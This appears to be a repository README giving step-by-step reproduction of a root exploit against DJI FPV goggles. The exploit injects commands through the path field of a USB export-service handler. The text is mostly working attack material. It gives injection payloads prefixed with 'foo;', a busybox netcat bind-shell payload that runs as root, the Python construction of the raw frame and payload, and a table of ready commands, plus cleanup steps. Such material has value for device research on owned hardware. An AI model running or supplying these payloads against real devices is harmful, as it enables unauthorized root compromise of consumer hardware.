# Reproduction

## Prerequisites

* Windows PC with the goggles connected over USB.
* DJI Assistant 2 (Consumer) drivers installed — the vendor interfaces are
  bound to DJI's `libusb0_device` service; `tools/libusb0_dji.py` loads
  `libusb0_device.dll` from the DJI Assistant install
  (`C:\Program Files (x86)\DJI Product\DJI Assistant 2 (Consumer Drones Series)\Drivers\...`).
* Python 3.12.
* The goggles' RNDIS interface up at `192.168.60.2` (PC `192.168.60.1`).
  `ping 192.168.60.2` should answer.

No `adb` is required for the root shell.

## 0. Verify the device is reachable

```powershell
py -3.12 tools\probe_ext_index.py
```

Expected:

```
dst=5d cs=19 cid=31 -> ...
```

With the benign default path this returns `e8` when the handler is
reached.

## 1. Harmless proof (optional)

```powershell
py -3.12 tools\pwn_ext_marker.py
```

This sends

```
path = "foo;touch /blackbox/upgrade/pwned"
```

and then checks the marker.  (`/blackbox/upgrade` is not readable through
the export service, so prefer `tools/pwn_ext_echo.py`, which writes
`/blackbox/system/pwned.txt` and verifies its existence.)

## 2. Start the root shell

```powershell
py -3.12 tools\spawn_shell.py
```

This sends the payload

```
foo;(while true; do /system/xbin/busybox nc -l -p 4444 \
     -e /system/bin/sh; done 2>/dev/null &)
```

to `dst=0x5D, cs=0x19, cid=0x31`.  The handler replies `00`.

## 3. Connect

Interactive client (relays stdin/stdout):

```powershell
py -3.12 tools\root_shell.py
```

or any netcat, **with LF-only lines**:

```
nc 192.168.60.2 4444
```

`ncat 7.80` is installed at `C:\Program Files (x86)\Nmap\ncat.exe` (user
PATH).  The goggles' `sh` ignores CR/CRLF, so a Windows console ncat
session may appear dead; use `tools\root_shell.py` (normalises CRLF), or
run ncat under Git Bash / WSL (sends LF).

You should get:

```
uid=0(root) gid=0(root) groups=0(root) context=u:r:dji_services:s0
```

## 4. Cleanup

```
pkill -f 'busybox nc -l -p 4444'
```

and, if you created them:

```
rm -f /blackbox/system/pwned.txt /blackbox/system/m_*.txt
```

Restore `adbd` if you experimented with it:

```powershell
py -3.12 tools\pwn_restore.py
```

## 5. Raw payload reference

Frame: `n3_file.pkt(0x0A, 0x5D, seq, 0x19, 0x31, payload, 0x40)`.

Payload for a command `C`:

```python
payload = bytes([0x01, 0x02, 0x00, len(C)]) + C.encode() + b'\x00'
```

Handy commands (all executed as root in `dji_services`):

| goal | `C` |
|---|---|
| marker | `foo;echo hi > /blackbox/system/marker.txt` |
| root shell | `foo;(while true; do /system/xbin/busybox nc -l -p 4444 -e /system/bin/sh; done 2>/dev/null &)` |
| read cmdline (via shell) | use the root shell |
| stop shell | `foo;pkill -f 'busybox nc -l -p 4444'` |

Notes:

* Keep the leading `foo` prefix (or the same prefix as the previous
  request) — the handler has a dedup `strncmp` against the first path.
* The exporter must be idle; if you get `d7`, wait for the previous export
  to finish (or power-cycle).
* The string is copied with `strncpy(..., 0xff)`; keep it under 255 bytes
  and NUL-terminated.
